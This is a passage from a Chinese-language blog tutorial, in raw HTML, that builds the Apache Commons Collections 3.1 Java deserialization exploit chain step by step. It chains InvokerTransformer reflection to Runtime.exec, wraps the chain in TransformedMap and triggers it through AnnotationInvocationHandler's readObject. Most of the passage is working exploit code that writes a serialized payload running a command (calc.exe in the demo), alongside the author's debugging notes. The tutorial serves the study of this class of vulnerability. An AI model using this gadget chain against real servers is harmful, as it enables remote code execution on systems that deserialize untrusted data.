class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端构造payload</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"><span class="comment">//服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">transformerChain_now.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>但是很遗憾的告诉以为快要成功的你，成功的本地测试加上序列化、反序列化过程之后就会失败。<br>因为Runtime类的定义没有继承<code>Serializable</code>类，所以是不支持反序列化的。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78azny32mj313q0emq79.jpg" alt="Runtime实例-序列化报错.jpg"></p><p>那么我们在payload写入Runtime实例的计划就泡汤了。</p><h4 id="第二点八步-在服务端生成Runtime实例"><a href="#第二点八步-在服务端生成Runtime实例" class="headerlink" title="第二点八步 在服务端生成Runtime实例"></a>第二点八步 在服务端生成Runtime实例</h4><p>既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？<br>我们知道Runtime的实例是通过<code>Runtime.getRuntime()</code>来获取的，而<code>InvokerTransformer</code>里面的反射机制可以执行任意函数。<br>同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的.</p><p>我们先看getRuntiime方法的参数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title">getRuntime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>没有参数，那就非常简单了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),<span class="comment">//得到Runtime class</span></span><br><span class="line">        <span class="comment">//由于InvokerTransformer的构造函数要求传入Class类型的参数类型，和Object类型的参数数值，所以封装一下，下面也一样</span></span><br><span class="line">        <span class="comment">//上面传入Runtime.class，调用Runtime class的getRuntime方法（由于是一个静态方法，invoke调用静态方法，传入类即可）</span></span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">        <span class="comment">//上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例)     </span></span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">transformerChain.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure></p><blockquote><p>在这里，之前自己陷入了一个很傻逼的问题，即：InvokerTransformer类transform方法中return method.invoke()这个语句<br>invoke()调用到底return了啥?<br>因为在这里形成了一个调用return的结果，再调用的链。为什么就可以上一个输出作为下一个输入时，可以成功调用了呢？<br>一开始以为invoke会统一返回一个对象作为下一个输入什么的，并且在调试的时候每次invoke的结果都不一样，源码看的头晕。<br>实际上是钻了死胡同：invoke的return是根据被调用的函数return啥，invoke就return啥。<br>就好比我invoke一个我自定义的方法a，在a中，我return了字符串”1”。那么就是invoke的结果就是字符串”1”。<br>看以上的过程就是第一次Runtime.getRuntime()的结果输入了下一个InvokerTransformer</p></blockquote><p>以上感觉是万事大吉了！但是实际上并不是…</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78azt7nmjj31tp0a3di9.jpg" alt="getClass理解错误-报错.jpg"></p><p>回想之前对于InvokerTransformer中<code>Class cls = input.getClass();</code>的解释</p><blockquote><p>这里我们需要注意到<code>input.getClass()</code>这个方法使用上的一些区别：</p><ul><li>当input是一个类的实例对象时，获取到的是这个类</li><li>当input是一个类时，获取到的是java.lang.Class</li></ul></blockquote><p>我们来推演第一次InvokerTransformer的反射调用，即得到Runtime类对象的getRuntime方法调用:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InvokeTransformer关键语句：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;<span class="comment">//input为我们设置的常量Runtime.class</span></span><br><span class="line">        Class cls = input.getClass();<span class="comment">//！！！这里由于input是一个类，会得到java.lang.Class</span></span><br><span class="line">        <span class="comment">//在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错！！</span></span><br><span class="line">        Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>那么我们好像陷入了一个死胡同：<br>得到Runtime类实例才能调用exec方法。<br>而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例………</p><p>…………………非常的尴尬…………………..</p><h4 id="第二点九步-还是反射机制"><a href="#第二点九步-还是反射机制" class="headerlink" title="第二点九步 还是反射机制"></a>第二点九步 还是反射机制</h4><p>那么我们通过直接调用Runtime.getRuntime方法好像是行不通了,有没有其他方法呢？</p><p><strong>还是反射机制</strong></p><p>已知：</p><ol><li>我们开头不能获得<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>，只能得到<code>Class.forName(&quot;java.lang.Class&quot;)</code></li><li>我们可以有任意的反射机制<br>求：</li><li>我们要获取到Runtime.getRunime函数，并执行它。<br>解：</li><li>通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制</li><li>通过getMethod函数获取Runtime类中的getRuntime函数<ul><li>在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的</li></ul></li><li>再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数</li><li>invoke调用getRuntime函数，获取Runtime类的实例<ul><li>这里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类</li></ul></li></ol><blockquote><p>具体变化细节，我选择把它放在反射机制一文中说明，这边给出结果。</p></blockquote><p>我们的最终目的是执行<br><code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)</code></p><p>先来获取getRuntime类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标语句</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br><span class="line"><span class="comment">//使用java.lang.Class开头</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Class"</span>).getMethod(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;)</span><br><span class="line">        .invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">//invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数</span></span><br></pre></td></tr></table></figure></p><p>对照着InvokerTransformer类转变为transformers格式<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Class</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//getMethod方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//在Runtime中找getRuntime方法，并返回这个方法</span></span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">       <span class="comment">//还需要填充 调用getRuntime得到Runtime实例,</span></span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还差执行获取到的getRuntime，下一个input是上一个执行接口，继续对照<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=getRuntime这个方法</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Method（getRuntime方法是method类）</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//在method类中找到invoke方法，method=invoke方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//调用invoke方法，input=getRuntime这个方法，传入自定义的参数</span></span><br></pre></td></tr></table></figure></p><p>以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。<br>首先this.iMethodName, this.iParamTypes是根据invoke接口而定的：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br><span class="line"><span class="function"><span class="comment">//this.iMethodName="invoke"</span></span></span><br><span class="line"><span class="function"><span class="comment">//this.iParamTypes=new Class[] &#123;Object.class, Object[].class &#125;</span></span></span><br><span class="line"><span class="function"><span class="comment">//外面class、Object封装是InvokerTransformer类的构造函数要求</span></span></span><br></pre></td></tr></table></figure></p><p>按照invoke中的input才是它要调用的环境的准则。<br><code>invoke方法.invoke(input, this.iArgs)</code>实际上等于<code>input.invoke(this.iArgs)</code>，<br>而input=getRuntime方法，那么只要填入<code>this.iArgs</code>就好了</p><p>又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。<br><code>this.iArgs=null,new Object[0]</code></p><p>那么整合就如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>以上代码其实就是等同于<br><code>((Runtime)Runtime.class.getMethod(&quot;getMethod&quot;,null).invoke(null,null)).exec(&quot;calc.exe&quot;);</code><br>我们笼统的来理解，实际就是如下（这里偷一张<a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">orleven</a>的图）：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78b00yk3zj30xg0bkmyn.jpg" alt="映射关系.png"></p><p>总体上来说：利用了反射机制调用反射机制的函数，绕过了开头cls只能为java.lang.Class的限制，根据具体环境input环环相扣，特么竟然恰好就通了<br>….非常的微妙….</p><h3 id="第三步-TransformedMap"><a href="#第三步-TransformedMap" class="headerlink" title="第三步 TransformedMap"></a>第三步 TransformedMap</h3><p>那么我们在第二步通过ConstantTransformer、ChainedTransformer就完成了<strong>payload在客户端自定义</strong>这一目标，我们看一下目前的攻击流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">commons_collections_3_1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，再调用transform函数</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78b0axl7ej31pj184k2w.jpg" alt="payload客户端构造.png"></p><p>完成命令执行服务端执行如下操作：</p><ol><li>服务端反序列化我们的输入成<strong>ChainedTransformer</strong>类型</li><li>调用这个输入的transform()函数</li></ol><p>转变的类型是一个数据转化链数据格式，很明显服务端不可能存在这种代码，利用价值不足，接下来我们需要继续延长这个漏洞链。</p><h4 id="封装成Map"><a href="#封装成Map" class="headerlink" title="封装成Map"></a>封装成Map</h4><p>由于我们得到的是ChainedTransformer，一个转换链，<strong>TransformedMap</strong>类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。</p><p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。很明显后者是一个常规操作，极有可能被触发。</p><p><code>TransformedMap</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>try一下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">    <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">    <span class="comment">//给予map数据转化链</span></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(outerMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.服务端接受反序列化，出发漏洞</span></span><br><span class="line">    <span class="comment">//读取文件，反序列化，模拟网络传输</span></span><br><span class="line">    FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务端反序列化成Map格式，再调用transform函数</span></span><br><span class="line">    Map outerMap_now =  (Map)fin.readObject();</span><br><span class="line">    <span class="comment">//2.1可以直接map添加新值，触发漏洞</span></span><br><span class="line">    <span class="comment">//outerMap_now.put("123", "123");</span></span><br><span class="line">    <span class="comment">//2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞</span></span><br><span class="line">    Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">    onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>亲测有效</p><h3 id="第四步-jdk1-7-AnnotationInvocationHandler的readObject复写点"><a href="#第四步-jdk1-7-AnnotationInvocationHandler的readObject复写点" class="headerlink" title="第四步 jdk1.7 AnnotationInvocationHandler的readObject复写点"></a>第四步 jdk1.7 AnnotationInvocationHandler的readObject复写点</h3><p>上面的漏洞触发条件仍然不够完美，需要服务端把我们传入的序列化内容反序列化为map，并对值进行修改。<br>之前也说过完美的反序列化漏洞还需要一个readobject复写点，使只要服务端执行了readObject函数就等于命令执行。</p><p>在jdk1.7中就存在一个完美的readobject复写点的类<code>sun.reflect.annotation.AnnotationInvocationHandler</code>。<br>我們先看他的构造函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;<span class="comment">//var1满足这个if条件时</span></span><br><span class="line">        <span class="keyword">this</span>.type = var1;<span class="comment">//传入的var1到this.type</span></span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;<span class="comment">//我们的map传入this.memberValues</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>readobject复写函数：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//默认反序列化</span></span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();<span class="comment">//</span></span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();<span class="comment">//获取我们构造map的迭代器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();<span class="comment">//遍历map迭代器</span></span><br><span class="line">            String var6 = (String)var5.getKey();<span class="comment">//获取key的名称</span></span><br><span class="line">            Class var7 = (Class)var3.get(var6);<span class="comment">//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();<span class="comment">//获取map的value</span></span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>虽然相对于这个类具体做什么，实在是没有精力去搞清楚了，但是它最终对于我们传入构造函数的map进行遍历赋值。<br>这样就弥补了我们之前反序列化需要服务端存在一些条件的不足，形成完美反序列化攻击。</p><p>最终模拟攻击代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 